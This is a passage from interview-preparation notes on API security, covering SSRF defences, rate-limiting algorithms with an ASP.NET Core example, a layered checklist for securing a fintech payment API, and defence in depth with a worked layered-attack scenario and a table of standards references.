**Where the vulnerability hides:** URL-fetching features (webhook registration, "import from URL", PDF/HTML rendering, image thumbnailing, link previews, SSO metadata fetching, XML parsers with external entity resolution). Any feature where a user supplies a URL is an SSRF candidate — and webhooks in a payments platform are exactly such a feature (Module 16).

**The architectural framing:** SSRF turns your service's **network position** into the attacker's. The defence is therefore both application-level (validate and allow-list) **and** network-level (the service should not be able to reach anything it does not need — which is Zero Trust egress control, Q23).

---

## Q31. What is rate limiting?

**Rate limiting** restricts how many requests a client may make in a time window. Per the Azure Architecture Center's Rate Limiting pattern, it exists to *"avoid or minimize throttling errors by controlling the consumption of resources"*, and the related Throttling pattern to *"control the consumption of resources from applications, tenants, or services."*

**It is simultaneously a security control and an availability control:**

| Protects against | How |
|---|---|
| **Brute force** on login, OTP, card enumeration | Caps attempts per account/IP |
| **Credential stuffing** | Slows automated attempts to a useless rate |
| **Scraping and enumeration** | Bounds data extraction rate |
| **Application-layer DoS** | Prevents one client saturating capacity |
| **Cost abuse** | Bounds spend on metered downstreams (an LLM API, an SMS gateway, a KYC provider) |
| **Noisy neighbour** | Fair sharing between tenants |
| **Runaway clients** | A buggy client's retry loop cannot take you down |

**Algorithms, and the trade-off between them:**

| Algorithm | Behaviour |
|---|---|
| **Fixed window** | Simple; suffers a **boundary burst** — 2× the limit across a window edge |
| **Sliding window** | Smooths the boundary problem; more state |
| **Token bucket** | **Allows bursts** up to the bucket size, then a steady refill rate. Usually the best fit for APIs |
| **Leaky bucket** | Enforces a strictly constant output rate; smooths bursts away |
| **Concurrency limiter** | Caps **in-flight** requests rather than rate — often the better control for protecting a saturated resource (Module 11 Q28) |

**In ASP.NET Core** (`AddRateLimiter`, built-in since .NET 7):
```csharp
builder.Services.AddRateLimiter(o =>
{
    o.AddTokenBucketLimiter("payments", opt =>
    {
        opt.TokenLimit = 100;                                  // burst allowance
        opt.TokensPerPeriod = 50;                              // refill
        opt.ReplenishmentPeriod = TimeSpan.FromSeconds(1);
        opt.QueueLimit = 0;                                    // reject rather than queue
    });
    o.RejectionStatusCode = StatusCodes.Status429TooManyRequests;
    o.OnRejected = async (ctx, ct) =>
        ctx.HttpContext.Response.Headers.RetryAfter = "1";     // tell the client what to do
});
```

**Design guidance that separates a good implementation:**
- **Choose the key deliberately** — per API key/client, per user, per tenant, per IP, or a combination. **IP alone is weak**: NAT and mobile carriers put thousands of users behind one address, and attackers rotate through proxies.
- **Different limits for different endpoints.** Login and OTP need much tighter limits than a product listing.
- **Return `429` with `Retry-After`** and the standard `RateLimit-*` headers, so well-behaved clients back off correctly rather than hammering harder.
- **Distributed state.** Per-instance limiting means the effective limit is `instances × limit`. Use Redis (or the gateway's own limiter) for a fleet-wide limit.
- **Layer it**: WAF rate-based rules and API Gateway throttling at the edge (cheapest place to reject), plus application-level limits for business rules a gateway cannot express.
- **Fail open or closed, deliberately.** If Redis is down, do you reject everything or allow everything? For a login endpoint, fail **closed**; for a product catalogue, fail **open**. Decide in advance.

---

## Q32. How do you secure a fintech payment API?

Every layer, with the regulatory requirement named at each — this is where a fintech panel expects specifics rather than generalities.

**1. Transport and edge.** TLS 1.2+ (1.3 preferred) with strong ciphers and HSTS; **mTLS for partner and merchant integrations**, with certificates pinned to an approved issuer (mandatory under PSD2/FAPI); CloudFront + **WAF** (managed rule sets, plus rate-based rules scoped to `/payments` and `/auth`); **Shield** for DDoS; and an API Gateway performing token validation, throttling and per-partner quotas.

**2. Authentication.** OAuth 2.0 **authorization code + PKCE** for user-facing clients; **client credentials with `private_key_jwt` or mTLS** for partners — never a shared secret in a plain header. **Sender-constrained (certificate-bound) access tokens** per RFC 8705, which is the FAPI requirement. Short access-token lifetimes (5–15 min) and rotated refresh tokens with reuse detection. **MFA — phishing-resistant where possible — for every human**, and step-up authentication for high-value operations.

**3. Authorization.** Scope + role + attribute + **object-level** checks on every request (Q17–Q20). Explicitly: **tenant isolation on every query** (a merchant must never be able to read another merchant's payment — BOLA is the number-one API risk), **approval limits** as claims, and **segregation of duties / four-eyes** on refunds, adjustments and configuration changes. No standing production write access for humans; JIT elevation with an approval trail.

**4. Request integrity.** **Idempotency keys mandatory** on every state-changing endpoint (Module 14 Q14) — a retry must never become a second charge. **Request signing** (HMAC or detached JWS over method, path, body hash, timestamp and nonce) for partner integrations, with a short timestamp window and nonce cache to prevent **replay**. Strict schema validation and hard limits on request size and array lengths.

**5. Data protection.** **Tokenise the PAN** so card data never enters your stores — this is the single biggest reducer of **PCI-DSS scope**. Field-level encryption for remaining PII with KMS CMKs; TLS everywhere internally; **no PAN, CVV, full track data, or credentials in logs, ever** — enforce with redaction middleware and test it. Data residency enforced by Region choice and SCPs.

**6. Fraud and abuse controls.** Velocity checks (per card, per device, per IP, per merchant), anomaly detection, device fingerprinting, **3-D Secure / SCA** where regulation requires it, and a decision log that records **why** a transaction was declined — because the customer and the regulator will both ask.

**7. Reliability as a security property.** Rate limits and quotas per partner; circuit breakers and bulkheads so one provider's outage does not cascade; graceful degradation; and **queue-and-confirm rather than fail** for ambiguous outcomes (Module 12 Q18).

**8. Auditability.** An **immutable audit log** of every payment operation, every authorization decision, every configuration change and every administrative action — write-once (S3 Object Lock), retained per the applicable regime (often 5–7 years), with correlation IDs linking the whole chain. **Event sourcing makes this inherent rather than bolted on** (Module 13 Q23).

**9. Compliance and process.** PCI-DSS scope minimisation and segmentation; SOX change control (IaC + pull request + separation of duties); SCA/PSD2 where applicable; annual penetration testing and continuous scanning; a documented and **tested** incident-response plan; vendor/third-party risk assessment; and **DORA-style tested resilience** with evidence.

**10. Reconciliation — the control that catches what the code cannot.** Nightly reconciliation against the provider's settlement file, with breaks classified and worked. No amount of application-level correctness substitutes for it (Module 14 Q18).

---

## Q33. How do you implement defence in depth?

**Defence in depth is the principle that no single control should be load-bearing** — you assume every layer will eventually fail, and design so that a failure at one layer is caught by another.

**Per the AWS Well-Architected Security pillar**, this is the "apply security at all layers" design principle: apply defence in depth with multiple controls at the edge, the VPC, the load balancer, the instance, the operating system, the application and the code.

**The layers, and what each catches:**

| Layer | Controls | What it catches when the layer above fails |
|---|---|---|
| **Governance** | SCPs, Config rules, admission policy, IaC review, separation of duties | A misconfiguration before it exists |
| **Edge** | CloudFront, WAF, Shield, rate limiting, geo-restriction | Volumetric attacks, known-bad payloads, brute force |
| **Network** | Private subnets, SG-to-SG rules, NACLs, NetworkPolicy, Network Firewall egress control, PrivateLink | Lateral movement, exfiltration paths |
| **Identity** | OAuth/OIDC, MFA, IAM roles per workload, mTLS, least privilege, JIT access | A stolen network position with no valid identity |
| **Application** | AuthN/AuthZ per request, object-level checks, input validation, output encoding, parameterised queries, CSRF tokens, CSP | An authenticated attacker attempting something they may not do |
| **Data** | Encryption at rest (KMS CMKs), tokenisation, field-level encryption, key policies, row-level security | A compromised host or a leaked backup |
| **Supply chain** | Signed images, SBOM, CVE scanning, dependency pinning, admission enforcement | A malicious or vulnerable dependency |
| **Detection** | CloudTrail, GuardDuty, Security Hub, flow logs, audit logs, anomaly alerting | Everything the preventive layers missed |
| **Response** | Runbooks, automated isolation, forensic snapshots, tested IR plan | Limits the damage once something is confirmed |

**Worked example — the same attack meeting successive layers:**

```
An attacker obtains a valid user's session token via a phishing page.

  Edge         → WAF rate-limits the unusual request volume            (slowed)
  Identity     → the token is sender-constrained to a client cert
                 the attacker does not have                             (BLOCKED)
  …had that failed:
  Application  → object-level authorization: the token's tenant claim
                 does not match the requested merchant's payments      (BLOCKED)
  …had that failed:
  Data         → the export is encrypted with a KMS key whose policy
                 restricts decrypt to a specific role                   (BLOCKED)
  …had that failed:
  Detection    → GuardDuty flags anomalous API volume; CloudTrail shows
                 the principal; the session is revoked                  (CONTAINED)
```
Any one layer alone would eventually be bypassed. Together, the attacker must defeat all of them.

**The principles that make it real rather than a diagram:**
1. **Assume every layer fails.** Design each control as if it is the last one standing.
2. **Prefer prevention over detection, but implement both.** An SCP that denies the action beats an alert that tells you it happened.
3. **Fail closed.** A default-deny NetworkPolicy, an authorization `FallbackPolicy`, a rate limiter that rejects when its state store is unavailable on a login endpoint.
4. **Make controls independent.** Two controls that share a root cause (both reading the same misconfigured claim) are one control wearing two hats.
5. **Minimise what needs protecting.** Tokenise the PAN, reduce PCI scope, delete data you do not need, and eliminate secrets entirely with workload identity. **The cheapest control is not having the asset.**
6. **Test the layers.** Penetration testing, red-team exercises, chaos and game days that deliberately disable a control to confirm the next one holds. An untested layer is an assumption.

---

## References — official documentation and standards

| Topic | Source |
|---|---|
| RFC 6749 — The OAuth 2.0 Authorization Framework | https://www.rfc-editor.org/rfc/rfc6749 |
| RFC 6750 — OAuth 2.0 Bearer Token Usage | https://www.rfc-editor.org/rfc/rfc6750 |
| RFC 7519 — JSON Web Token (JWT) | https://www.rfc-editor.org/rfc/rfc7519 |
| RFC 7515 / 7516 — JSON Web Signature / Encryption | https://www.rfc-editor.org/rfc/rfc7515 |
| RFC 7636 — Proof Key for Code Exchange (PKCE) | https://www.rfc-editor.org/rfc/rfc7636 |
| RFC 7662 — OAuth 2.0 Token Introspection | https://www.rfc-editor.org/rfc/rfc7662 |
| RFC 8693 — OAuth 2.0 Token Exchange | https://www.rfc-editor.org/rfc/rfc8693 |
| RFC 8705 — OAuth 2.0 Mutual-TLS and certificate-bound tokens | https://www.rfc-editor.org/rfc/rfc8705 |
| **RFC 9700 — OAuth 2.0 Security Best Current Practice** | https://www.rfc-editor.org/rfc/rfc9700 |
| RFC 9449 — OAuth 2.0 Demonstrating Proof of Possession (DPoP) | https://www.rfc-editor.org/rfc/rfc9449 |
| RFC 9110 — HTTP Semantics (401/403, idempotent methods) | https://www.rfc-editor.org/rfc/rfc9110 |
| OAuth 2.1 (draft) | https://datatracker.ietf.org/doc/draft-ietf-oauth-v2-1/ |
| OpenID Connect Core 1.0 | https://openid.net/specs/openid-connect-core-1_0.html |
| OpenID Connect Discovery 1.0 | https://openid.net/specs/openid-connect-discovery-1_0.html |
| FAPI 2.0 Security Profile (financial-grade API) | https://openid.net/specs/fapi-2_0-security-profile.html |
| NIST SP 800-207 — Zero Trust Architecture | https://csrc.nist.gov/publications/detail/sp/800-207/final |
| NIST SP 800-63B — Digital Identity Guidelines (authentication) | https://pages.nist.gov/800-63-3/sp800-63b.html |
| Microsoft Learn — ASP.NET Core authentication overview | https://learn.microsoft.com/en-us/aspnet/core/security/authentication/ |
| Microsoft Learn — JWT bearer authentication | https://learn.microsoft.com/en-us/aspnet/core/security/authentication/configure-jwt-bearer-authentication |
| Microsoft Learn — policy-based authorization | https://learn.microsoft.com/en-us/aspnet/core/security/authorization/policies |
| Microsoft Learn — resource-based authorization | https://learn.microsoft.com/en-us/aspnet/core/security/authorization/resourcebased |
| Microsoft Learn — CORS in ASP.NET Core | https://learn.microsoft.com/en-us/aspnet/core/security/cors |
| Microsoft Learn — prevent CSRF (antiforgery) | https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery |
| Microsoft Learn — prevent XSS | https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting |
| Microsoft Learn — rate limiting middleware | https://learn.microsoft.com/en-us/aspnet/core/performance/rate-limit |
| Microsoft Learn — Data Protection API | https://learn.microsoft.com/en-us/aspnet/core/security/data-protection/introduction |
| Microsoft Learn — Microsoft identity platform (OBO flow) | https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-on-behalf-of-flow |
| OWASP Top 10 | https://owasp.org/www-project-top-ten/ |
| OWASP Cheat Sheet Series (XSS, CSRF, SQLi, SSRF, Auth) | https://cheatsheetseries.owasp.org/ |
| OWASP — SQL Injection Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html |
| OWASP — SSRF Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html |
| AWS Well-Architected — Security pillar | https://docs.aws.amazon.com/wellarchitected/latest/security-pillar/welcome.html |
| AWS — IMDSv2 and protecting instance metadata | https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html |
| AWS — Secrets Manager rotation | https://docs.aws.amazon.com/secretsmanager/latest/userguide/rotating-secrets.html |
| AWS — KMS key policies | https://docs.aws.amazon.com/kms/latest/developerguide/key-policies.html |
| PCI Security Standards Council — PCI DSS | https://www.pcisecuritystandards.org/document_library/ |
| Azure Architecture Center — Rate Limiting / Throttling patterns | https://learn.microsoft.com/en-us/azure/architecture/patterns/rate-limiting-pattern |

---

**Previous:** [14 — CQRS, Saga, Outbox & Idempotency](./14-CQRS-Saga-Outbox-Idempotency.md) | **Next:** [16 — API Security / OWASP](./16-API-Security-OWASP.md)
